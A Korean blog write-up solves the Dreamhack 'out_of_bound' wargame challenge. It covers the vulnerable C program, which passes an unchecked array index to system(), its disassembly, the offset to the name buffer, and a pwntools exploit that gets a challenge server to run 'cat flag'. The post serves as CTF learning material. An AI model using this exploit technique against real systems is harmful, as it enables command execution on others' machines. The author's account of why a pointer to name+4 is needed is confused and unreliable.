---
published: true
image: /img
layout: post
title: Dreamhack out_of_bound 문제풀이
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2022-03-07 21:00
---

out of bound(OOB)는 버퍼의 길이를 벗어나는 인덱스를 참조하려 할때 발생할 수 있는 취약점이다.
<br>
이번 문제의 소스코드를 먼저 살펴보자.

```c++
char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

main함수를 따라가면서 살펴보면 먼저 관리자 이름을 name이라는 변수에 입력 받는다. 이후 What do you want?라는 문구와 함께 어떤 작업을 실행할 것인지 int형을 scanf로 입력 받는다. 이후 입력받은 값을 idx라는 변수에 넣고 system함수를 통해 command[idx]를 실행하고 프로그램은 종료한다.

system함수는 C언어 내부에서 쉘을 사용할 수 있는 기능을 제공하며 배열 10이 할당되어 있으나 scanf에서는 입력받는 크기가 제한이 없는것을 볼수 있다. 이부분을 공략하면 될 것 같다.

일단 같이 제공된 바이너리를 peda를 통해 disas main 해보자.
```shell
   0x080486cb <+0>: 	lea    ecx,[esp+0x4]
   0x080486cf <+4>: 	and    esp,0xfffffff0
   0x080486d2 <+7> :	push   DWORD PTR [ecx-0x4]
   0x080486d5 <+10>:	push   ebp
   0x080486d6 <+11>:	mov    ebp,esp
   0x080486d8 <+13>:	push   ecx
   0x080486d9 <+14>:	sub    esp,0x14
   0x080486dc <+17>:	mov    eax,gs:0x14
   0x080486e2 <+23>:	mov    DWORD PTR [ebp-0xc],eax
   0x080486e5 <+26>:	xor    eax,eax
   0x080486e7 <+28>:	call   0x804867b <initialize>
   0x080486ec <+33>:	sub    esp,0xc
   0x080486ef <+36>:	push   0x8048811
   0x080486f4 <+41>:	call   0x80484b0 <printf@plt>
   0x080486f9 <+46>:	add    esp,0x10
   0x080486fc <+49>:	sub    esp,0x4
   0x080486ff <+52>:	push   0x10
   0x08048701 <+54>:	push   0x804a0ac
   0x08048706 <+59>:	push   0x0
   0x08048708 <+61>:	call   0x80484a0 <read@plt>
   0x0804870d <+66>:	add    esp,0x10
   0x08048710 <+69>:	sub    esp,0xc
   0x08048713 <+72>:	push   0x804881e
   0x08048718 <+77>:	call   0x80484b0 <printf@plt>
   0x0804871d <+82>:	add    esp,0x10
   0x08048720 <+85>:	sub    esp,0x8
   0x08048723 <+88>:	lea    eax,[ebp-0x10]
   0x08048726 <+91>:	push   eax
   0x08048727 <+92>:	push   0x8048832
   0x0804872c <+97>:	call   0x8048540 <__isoc99_scanf@plt>
   0x08048731 <+102>:	add    esp,0x10
   0x08048734 <+105>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048737 <+108>:	mov    eax,DWORD PTR [eax*4+0x804a060]
   0x0804873e <+115>:	sub    esp,0xc
   0x08048741 <+118>:	push   eax
   0x08048742 <+119>:	call   0x8048500 <system@plt>
   0x08048747 <+124>:	add    esp,0x10
   0x0804874a <+127>:	mov    eax,0x0
   0x0804874f <+132>:	mov    edx,DWORD PTR [ebp-0xc]
   0x08048752 <+135>:	xor    edx,DWORD PTR gs:0x14
   0x08048759 <+142>:	je     0x8048760 <main+149>
   0x0804875b <+144>:	call   0x80484e0 <__stack_chk_fail@plt>
   0x08048760 <+149>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048763 <+152>:	leave  
   0x08048764 <+153>:	lea    esp,[ecx-0x4]
   0x08048767 <+156>:	ret 
```
우선 집중해서 봐야할 부분은 name의 주소값과 command의 주소값인것 같다.

name    : 0x804a0ac<br>
command : 0x804a060

각 주소값의 거리를 계산해 보면 name(0x804a0ac) - command(0x804a060) = 0x4C이다.
4C를 10진수로 변환하면 76이고 포인터 배열이 하나당 4바이트씩 할당하니 76/4를 하면 19가 나온다.

name의 위치는 command주소로 부터 [19]만큼 떨어져 있다고 볼수 있다.
그럼 name에는 "/bin/sh"를 주고 idx를 19를 입력하면 될것 같다.

여기서 조심해야 할 것이 system함수이다.

system 함수는 외부 라이브러리이기 때문에 변수주소_4바이트+exec_code(인수)로 구성되어 있다고 한다. 예를 들어 system("cat flag"); 이라는 명령어를 실행하면 메모리에는 변수주소_4바이트 + cat flag가 들어간다. 따라서 결과 리턴을 위한 name+4의 값과  cat flag를 인수로 줘야 한다.

이제 파이썬을 이용해 익스플로잇 코드를 짜보자

```python
from pwn import *

conn = remote("host2.dreamhack.games", 16966)

print(conn.recv())

payload = p32(0x804a0ac+4) #name주소 + 4byte
payload += b"cat flag"
print(payload)
conn.sendline(payload)
print(conn.recv())

conn.sendline(b"19")
print(conn.recvall().decode('utf-8'))
```

위 코드를 실행하면 플레그 값을 얻을 수 있다.
이번 문제를 풀면서 system함수의 어셈블리 호출규약을 알아볼 필요성을 느꼈다.
좀더 공부를 하고 포스팅 내용을 보충해야 겠다.

